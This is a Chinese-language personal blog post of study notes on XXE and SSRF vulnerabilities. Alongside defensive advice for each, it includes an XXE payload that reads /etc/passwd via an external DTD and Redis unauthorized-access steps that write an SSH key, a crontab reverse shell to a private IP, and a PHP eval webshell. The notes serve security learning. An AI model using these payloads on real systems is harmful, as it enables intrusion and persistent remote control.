<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">xxe和ssrf</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2019-2-23</span><br><br></div><section id="articleDiv"><p>前言:xxe和ssrf是比较严重的漏洞，本次初步了解这两个漏洞</p><br><h2 id="xxe-xml外部实体注入"><a href="#xxe-xml外部实体注入" class="headerlink" title="xxe(xml外部实体注入)"></a>xxe(xml外部实体注入)</h2><h3 id="xml-可扩展标识语言"><a href="#xml-可扩展标识语言" class="headerlink" title="xml(可扩展标识语言)"></a>xml(可扩展标识语言)</h3><h4 id="xml文档结构"><a href="#xml文档结构" class="headerlink" title="xml文档结构"></a>xml文档结构</h4><h5 id="1-xml声明"><a href="#1-xml声明" class="headerlink" title="1.xml声明"></a>1.xml声明</h5><h5 id="2-dtd文档类型定义"><a href="#2-dtd文档类型定义" class="headerlink" title="2.dtd文档类型定义"></a>2.dtd文档类型定义</h5><h5 id="3-文档元素"><a href="#3-文档元素" class="headerlink" title="3.文档元素"></a>3.文档元素</h5><h4 id="xml实体-ENTITY-xml语言的变量"><a href="#xml实体-ENTITY-xml语言的变量" class="headerlink" title="xml实体(ENTITY):xml语言的变量"></a>xml实体(ENTITY):xml语言的变量</h4><h5 id="分类-普通实体和参数实体"><a href="#分类-普通实体和参数实体" class="headerlink" title="分类:普通实体和参数实体"></a>分类:普通实体和参数实体</h5><h4 id="dtd-文档类型定义"><a href="#dtd-文档类型定义" class="headerlink" title="dtd(文档类型定义)"></a>dtd(文档类型定义)</h4><p>1.内部DTD文档</p><br><p>&lt;!DOCTYPE 根元素[定义内容]&gt;</p><br><p>2.外部DTD文档</p><br><p>&lt;!DOCTYPE 根元素 SYSTEM “DTD文件路径”&gt;</p><br><p>3.内外部DTD文档结合</p><br><p>&lt;!DOCTYPE 根元素 SYSTEM “DTD文件路径” [定义内容]&gt;</p><br><h3 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h3><h4 id="原理-参数实体引入外部实体"><a href="#原理-参数实体引入外部实体" class="headerlink" title="原理(参数实体引入外部实体)"></a>原理(参数实体引入外部实体)</h4><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>1.XML是否会被成功解析<br>2.服务器是否支持DTD引用外部实体</p><br><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p><br><p>&lt;!DOCTYPE %test[</p><br><pre><code>&lt;!ENTITY % a SYSTEM &quot;<a href="http://www.test.com/outdtd.dtd&quot;">http://www.test.com/outdtd.dtd&quot;</a>&gt;<br><br>% a;]&gt;<br></code></pre><test>&xxe;</test><br><br><p>outdtd.dtd</p><br><p>&lt;!ENTITY xxe SYSTEM “file///etc/passwd”&gt;</p><br><h4 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h4><p>libxml2:file,http,ftp</p><br><p>php:file,http,ftp,php,data,glob,phar</p><br><p>java:file,http,ftp,https,jar,netdoc,mailto,gopher</p><br><p>.net:file,http,ftp,https</p><br><h3 id="xxe危害"><a href="#xxe危害" class="headerlink" title="xxe危害"></a>xxe危害</h3><h4 id="1-读取任意文件"><a href="#1-读取任意文件" class="headerlink" title="1.读取任意文件"></a>1.读取任意文件</h4><p><img src="/2019/02/23/xxe和ssrf/1.png" alt="1"></p><br><h4 id="2-url请求"><a href="#2-url请求" class="headerlink" title="2.url请求"></a>2.url请求</h4><p><img src="/2019/02/23/xxe和ssrf/2.png" alt="2"><br><img src="/2019/02/23/xxe和ssrf/2-1.png" alt="3"></p><br><h4 id="3-dos拒绝服务"><a href="#3-dos拒绝服务" class="headerlink" title="3.dos拒绝服务"></a>3.dos拒绝服务</h4><p><img src="/2019/02/23/xxe和ssrf/3.png" alt="3"></p><br><h3 id="xxe漏洞修复与防御"><a href="#xxe漏洞修复与防御" class="headerlink" title="xxe漏洞修复与防御"></a>xxe漏洞修复与防御</h3><h4 id="1-使用开发语言提供的禁用外部实体的方法"><a href="#1-使用开发语言提供的禁用外部实体的方法" class="headerlink" title="1.使用开发语言提供的禁用外部实体的方法"></a>1.使用开发语言提供的禁用外部实体的方法</h4><p>php:libxml_disable_entity_loader(true);</p><br><p>java:</p><br><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p><br><p>dbf.setExpandEntityReferences(false);</p><br><p>python:</p><br><p>from lxml import etree</p><br><p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><br><h4 id="2-过滤关键词"><a href="#2-过滤关键词" class="headerlink" title="2.过滤关键词"></a>2.过滤关键词</h4><p>过滤&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p><br><h2 id="ssrf-服务端跨站请求伪造"><a href="#ssrf-服务端跨站请求伪造" class="headerlink" title="ssrf(服务端跨站请求伪造)"></a>ssrf(服务端跨站请求伪造)</h2><h3 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h3><p>攻击者从网站A(连接内外网且存在ssrf漏洞)直接访问网站B(无法从外网直接访问)</p><br><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制</p><br><h3 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3><p>1.通过URL地址分享网页内容<br>2.通过URL地址加载或下载图片</p><br><h3 id="攻击应用"><a href="#攻击应用" class="headerlink" title="攻击应用"></a>攻击应用</h3><p>ssrf作为跳板可攻击内网多种应用如redis,discuz,fastcgi,memcache,webdav,struts,jboss,axis2等应用</p><br><h4 id="redis未授权访问-6379端口开放"><a href="#redis未授权访问-6379端口开放" class="headerlink" title="redis未授权访问(6379端口开放)"></a>redis未授权访问(6379端口开放)</h4><p>redis-cli -h 192.168.xxx.xxx</p><br><p>info</p><br><h5 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h5><p>1.config set dir /root/.ssh</p><br><p>2.config set dbfilename authorized_keys</p><br><p>3.set 1 “\n\n\n公钥\n\n\n”</p><br><p>4.save</p><br><h5 id="在crontab里写定时任务，反弹shell"><a href="#在crontab里写定时任务，反弹shell" class="headerlink" title="在crontab里写定时任务，反弹shell"></a>在crontab里写定时任务，反弹shell</h5><p>1.config set dir /var/spool/cron</p><br><p>2.config set dbfilename root</p><br><p>3.set xxx “\n\n<em>/1 </em> <em> </em> * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n”</p><br><p>4.save</p><br><h5 id="在web目录下写入webshell"><a href="#在web目录下写入webshell" class="headerlink" title="在web目录下写入webshell"></a>在web目录下写入webshell</h5><p>1.config set dir /var/www/html</p><br><p>2.config set dbfilename webshell.php</p><br><p>3.set xxx “\n\n\n&lt;?php @eval($_POST[‘c’]);?&gt;\n\n\n”</p><br><p>4.save</p><br><h4 id="redis未授权访问在windows下的利用-详见https-www-anquanke-com-post-id-170360"><a href="#redis未授权访问在windows下的利用-详见https-www-anquanke-com-post-id-170360" class="headerlink" title="redis未授权访问在windows下的利用(详见https://www.anquanke.com/post/id/170360)"></a>redis未授权访问在windows下的利用(详见<a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a>)</h4><h5 id="1-能够获取web绝对路径的，直接写入webshell"><a href="#1-能够获取web绝对路径的，直接写入webshell" class="headerlink" title="1.能够获取web绝对路径的，直接写入webshell"></a>1.能够获取web绝对路径的，直接写入webshell</h5><h5 id="2-写入启动项"><a href="#2-写入启动项" class="headerlink" title="2.写入启动项"></a>2.写入启动项</h5><h5 id="3-写入mof、dll劫持等"><a href="#3-写入mof、dll劫持等" class="headerlink" title="3.写入mof、dll劫持等"></a>3.写入mof、dll劫持等</h5><h4 id="redis未授权访问防御"><a href="#redis未授权访问防御" class="headerlink" title="redis未授权访问防御"></a>redis未授权访问防御</h4><p>1.修改 redis.conf 文件，禁用远程修改 DB 文件地址</p><br><p>2.以低权限运行 Redis 服务</p><br><p>3.为 Redis 添加密码验证</p><br><p>4.禁止外网访问 Redis</p><br><p>5.修改默认端口</p><br><p>6.保证 authorized_keys 文件的安全</p><br><p>7.设置防火墙策略</p><br><h3 id="ssrf防御"><a href="#ssrf防御" class="headerlink" title="ssrf防御"></a>ssrf防御</h3><p>1.过滤返回信息</p><br><p>2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</p><br><p>3.限制请求的端口为http常用的端口，比如:80,443,8080</p><br><p>4.黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网</p><br><p>5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</p>
</section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>